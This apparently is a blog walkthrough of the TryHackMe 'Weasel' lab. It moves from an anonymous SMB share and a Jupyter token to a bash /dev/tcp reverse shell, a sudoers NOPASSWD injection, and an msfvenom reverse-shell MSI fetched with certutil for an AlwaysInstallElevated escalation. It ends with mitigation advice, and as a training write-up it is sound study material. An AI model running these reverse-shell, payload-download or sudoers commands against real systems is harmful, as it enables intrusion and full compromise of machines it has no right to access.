---
title: Weasel
date: 2025-04-26
categories: [oscp, THM]
tags: [oscp-preparation, walkthrough, jupyter-notebook, WSL, privesc-AlwaysInstallElevated] 
image: weasel.png
media_subpath: /assets/img/posts/2025-04-26-weaselTHM/
---
## Introduction
In this walkthrough, we will be solving the TryHackMe Medium Windows box Weasel.

We first gained access by finding an open SMB share allowing anonymous login and retrieving a Jupyter Notebook token. Using the Jupyter terminal, we executed a Bash reverse shell into a WSL environment. From there, two paths were available: exploiting a sudo misconfiguration in WSL to escalate to root and mount the Windows filesystem to access both user.txt and root.txt; or retrieving an SSH private key from the user's home directory, connecting via SSH as a low-privileged user, and exploiting the AlwaysInstallElevated registry misconfiguration to gain a SYSTEM shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check first 100 UDP ports:

```bash
 sudo nmap -sU -F $IP
```

![image.png](image%201.png)

No valuable UDP ports.

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22  (SSH)

We usually skip SSH.

### Port 139/445 (SMB,RPC)

- **smbclient**
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    ![image.png](image%203.png)
    
- **crackmapexec**
    
    ```bash
    sudo crackmapexec smb $IP -u anon -p '' --shares
    ```
    
    ![image.png](image%204.png)
    
- **datasci-share**
    
    ```bash
    smbclient  //$IP/datasci-team -N
    ```
    
    ![image.png](image%205.png)
    
    Let’s download a share to local directory and analyze it on web.
    
    ```bash
    RECURSE ON
    PROMPT OFF
    mget *
    python3 -m http.server 80
    ```
    
    - jupiter-token → 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a

### Port 3389 (RDP)

We don’t have potential username and passwords that’s why we skip RDP for now.

### Port 5985 (WinRM)

The same applies for WinRM.

## Web

### Port 8888 (HTTP)

- Version **TornadoServer/6.0.3**
    
    ```bash
    searchsploit Tornado
    ```
    
    **No result.**
    
- robots.txt and sitemap.xml
- Methods - GET,POST

I used found jupyter-token in login page and logged in.

## Exploitation

Under new I have found terminal and it opened a terminal.

![image.png](image%206.png)

Another way of getting a shell from Jupyter is described [here](https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/#remote-code-execution-(rce))

![image.png](image%207.png)

Let’s get a reverse shell on our machine.

![image.png](image%208.png)

**Datasci-share** is right under home directory, we can upload reverse shell and execute it from terminal.

The system is Ubuntu 20.04.4 that with high chance means that we are inside of a WSL, let’s get a reverse shell using bash.

```bash
bash -c 'bash -i >& /dev/tcp/10.23.93.200/135 0>&1'
```

Upgrade shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 1st way

![image.png](image%209.png)

I found `.config` directory, and there I found another directory called `wslu` which most probably means **Windows Subsystem Linux Ubuntu.**

Checking `sudo -l` we see:

![image.png](image%2010.png)

Checking `/home/dev-datasci/.local/bin/` we don’t find jupyter binary so let’s create one and execute.

```bash
echo 'echo "dev-datasci ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > /home/dev-datasci/.local/bin/jupyter
```

```bash
echo 'echo "dev-datasci ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > jupyter
```

![image.png](image%2011.png)

Now we are root, so we can mount windows host directories to WSL:

```bash
mount -t drvfs C: /mnt/c
```

[Pentesting WSL](https://exploit-notes.hdks.org/exploit/windows/wsl/wsl-pentesting/#escape-wsl-to-windows-host-machine)

- When you're **root inside WSL**, and you mount `C:` using `mount -t drvfs C: /mnt/c`, **being root in WSL effectively bypasses Windows file permission checks** *inside* WSL.
- DrvFs **does not enforce** NTFS file permissions strictly when accessed from WSL **as root**.
- WSL *trusts* you as root inside the Linux subsystem — and **Windows itself** isn't enforcing the ACLs (Access Control Lists) on WSL file operations directly.

### 2nd way

We are gonna use SSH private key found under `dev-datasci` user `home` directory and login using it with SSH, but pay attention that user in Windows is not called `dev-datasci` but `dev-datasci-lowpriv` as the name of the file suggests.

```bash
ssh dev-datasci-lowpriv@$IP -i dev-datasci-lowpriv_id_ed25519
```

Now we are inside of a Windows machine and we can read `user.txt`:

![image.png](image%2012.png)

Running [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) I identified Autologon credentials of dev-datasci-lowpriv I am gonna use it for Administrator:

![image.png](image%2013.png)

```bash
evil-winrm -i 10.10.95.231 -u Administrator -p 'wUqnKWqzha*W!PWrPRWi!M8faUn'
```

## Credentials

```text
dev-datasci-lowpriv : wUqnKWqzha*W!PWrPRWi!M8faUn
```


That didn’t work.

I have found `AlwaysInstallElevated` registry key set, so we just need to make `.msi` file and execute it from Windows host as reverse shell.

![image.png](image%2014.png)

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.23.93.200 lport=135 -f msi -o reverse.msi
```

Transfer it using:

```powershell
certutil -urlcache -split -f http://10.23.93.200/reverse.msi
```

and run it:

```powershell
msiexec /quiet /qn /i reverse.msi
```

This didn’t work let’s try running it from new session using runas:

```powershell
runas /user:dev-datasci-lowpriv "msiexec /i C:\tools\reverse.msi”
```

> We **spawned a new process** under the low-privileged user account **from scratch**, and this **triggered Windows Installer to check the AlwaysInstallElevated keys properly**.
{: .prompt-warning }

![image.png](image%2015.png)

Now we are NT Authority\System.

## Mitigation

- **WSL (Windows Subsystem for Linux) Security Hardening**
    - **Restrict `sudo` permissions** inside WSL environments.
        
        Ensure that users cannot run arbitrary scripts as `root` without authentication (`NOPASSWD` should not be used carelessly).
        
    - **Secure mount permissions** by **restricting WSL from accessing Windows drives** via `drvfs` mount unless explicitly needed.
    - **Disable WSL integration** if it is not necessary on production or sensitive systems.
    - Regularly monitor WSL environments for **escalation paths** back into the Windows host.
- **SSH Key Management**
    - **Never store private SSH keys** unsecured inside user directories.
    - **Use passphrases** for SSH private keys to prevent easy unauthorized use if the key is found.
    - Apply **proper file permissions** (`600`) on `.ssh` folders and keys.
- A**lwaysInstallElevated Protection**
    - **Ensure AlwaysInstallElevated is disabled** (`AlwaysInstallElevated=0`) under both:
        - `HKLM\Software\Policies\Microsoft\Windows\Installer`
        - `HKCU\Software\Policies\Microsoft\Windows\Installer`
    - Perform **regular audits of Windows registry settings** to detect dangerous misconfigurations like AlwaysInstallElevated being enabled.
- **General Defensive Measures**
    - **Restrict access to open SMB shares** and avoid allowing anonymous (`null session`) access.
    - **Apply strict permissions** on sensitive folders, preventing unauthorized read/write access.
    - **Monitor for suspicious process executions**, especially `msiexec.exe` and unexpected mounting operations from WSL environments.
    - Enable **logging and alerting** for administrative activities and privilege escalations.
